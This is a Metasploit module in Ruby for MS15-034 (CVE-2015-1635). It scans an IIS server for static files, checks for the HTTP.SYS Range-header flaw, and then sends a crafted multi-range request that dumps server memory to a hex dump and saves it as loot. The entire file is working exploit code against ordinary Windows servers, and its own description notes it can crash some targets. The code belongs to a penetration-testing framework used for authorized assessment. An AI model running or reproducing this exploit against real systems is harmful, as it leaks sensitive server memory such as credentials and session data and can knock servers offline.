##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure',
      'Description' => %q{
        This module dumps memory contents using a crafted Range header and affects only
        Windows 8.1, Server 2012, and Server 2012R2. Note that if the target
        is running in VMware Workstation, this module has a high likelihood
        of resulting in BSOD; however, VMware ESX and non-virtualized hosts
        seem stable. Using a larger target file should result in more memory
        being dumped, and SSL seems to produce more data as well.
      },
      'Author'      =>
        [
          'Rich Whitcroft <rwhitcroft[at]gmail.com>', # Msf module
          'sinn3r',                                   # Some more Metasploit stuff
          'Sunny Neo <sunny.neo[at]centurioninfosec.sg>' #Added VHOST option

        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2015-1635'],
          ['MSB', 'MS15-034'],
          ['URL', 'http://pastebin.com/ypURDPc4'],
          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150'],
          ['URL', 'https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection'],
          ['URL', 'http://www.securitysift.com/an-analysis-of-ms15-034/'],
          ['URL', 'http://securitysift.com/an-analysis-of-ms15-034/']
        ]
    ))

    register_options([
      OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/']),
      OptBool.new('SUPPRESS_REQUEST', [ true, 'Suppress output of the requested resource', true ])
    ])

  end

  def potential_static_files_uris
    uri = normalize_uri(target_uri.path)

    return [uri] unless uri[-1, 1] == '/'

    uris = ["#{uri}iisstart.htm", "#{uri}iis-85.png", "#{uri}welcome.png"]
    res  = send_request_raw('uri' => uri)

    return uris unless res

    site_uri = URI.parse(full_uri)
    page     = Nokogiri::HTML(res.body.encode('UTF-8', invalid: :replace, undef: :replace))

    page.xpath('//link|//script|//style|//img').each do |tag|
      %w(href src).each do |attribute|
        attr_value = tag[attribute]
        next unless attr_value && !attr_value.empty?
        uri = site_uri.merge(URI.encode(attr_value.strip))
        next unless uri.host == vhost || uri.host == rhost
        uris << uri.path if uri.path =~ /\.[a-z]{2,}$/i # Only keep path with a file
      end
    end

    uris.uniq
  end

  def check_host(ip)
    upper_range = 0xFFFFFFFFFFFFFFFF

    potential_static_files_uris.each do |potential_uri|
      uri = normalize_uri(potential_uri)

      res = send_request_raw(
        'uri' => uri,
        'method' => 'GET',
        'headers' => {
          'Range' => "bytes=0-#{upper_range}"
        }
      )

      if res && res.body.include?('Requested Range Not Satisfiable')
        vmessage = "#{peer} - Checking #{uri} [#{res.code}]"
        vprint_status("#{vmessage} - Vulnerable")

        # Save the file that we want to use for the information leak
        target_uri.path = uri

        return Exploit::CheckCode::Vulnerable
      elsif res && res.body.include?('The request has an invalid header name')
        return Exploit::CheckCode::Safe
      end
    end

    Exploit::CheckCode::Unknown
  end

  def dump(data)
    # clear out the returned resource
    if datastore['SUPPRESS_REQUEST']
      dump_start = data.index('HTTP/1.1 200 OK')
      if dump_start
        data[0..dump_start-1] = ''
      else
        print_error("Memory dump start position not found, dumping all data instead")
      end
    end

    print_line
    print_good("Memory contents:")
    print_line(Rex::Text.to_hex_dump(data))
  end

  # Needed to allow the vulnerable uri to be shared between the #check and #dos
  def target_uri
    @target_uri ||= super
  end

  def get_file_size
    @file_size ||= lambda {
      file_size = -1
      uri = normalize_uri(target_uri.path)
      res = send_request_raw('uri' => uri)

      unless res
        vprint_error("Connection timed out")
        return file_size
      end

      if res.code == 404
        vprint_error("You got a 404. URI must be a valid resource.")
        return file_size
      end

      file_size = res.headers['Content-Length'].to_i
      vprint_status("File length: #{file_size} bytes")

      return file_size
    }.call
  end

  def calc_ranges(content_length)
    ranges = "bytes=3-18446744073709551615"

    range_step = 100
    for range_start in (1..content_length).step(range_step) do
      range_end = range_start + range_step - 1
      range_end = content_length if range_end > content_length
      ranges << ",#{range_start}-#{range_end}"
    end

    ranges
  end

  def run_host(ip)
    begin
      unless check_host(ip)
        print_error("Target is not vulnerable")
        return
      else
        print_good("Target may be vulnerable...")
      end

      content_length = get_file_size
      ranges = calc_ranges(content_length)

      uri = normalize_uri(target_uri.path)
      cli = Rex::Proto::Http::Client.new(
        ip,
        rport,
        {},
        datastore['SSL'],
        datastore['SSLVersion'],
        nil,
        datastore['USERNAME'],
        datastore['PASSWORD']
      )
      cli.connect
      req = cli.request_raw(
        'uri' => target_uri.path,
        'method' => 'GET',
        'vhost' => "#{datastore['VHOST']}",
        'headers' => {
        'Range' => ranges
        }
      )
      cli.send_request(req)

      print_good("Stand by...")

      resp = cli.read_response

      if resp
        dump(resp.to_s)
        loot_path = store_loot('iis.ms15034', 'application/octet-stream', ip, resp, nil, 'MS15-034 HTTP.SYS Memory Dump')
        print_good("Memory dump saved to #{loot_path}")
      else
        print_error("Disclosure unsuccessful (must be 8.1, 2012, or 2012R2)")
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("Unable to connect")
      return
    rescue ::Timeout::Error, ::Errno::EPIPE
      print_error("Timeout receiving from socket")
      return
    ensure
      cli.close if cli
    end
  end
end
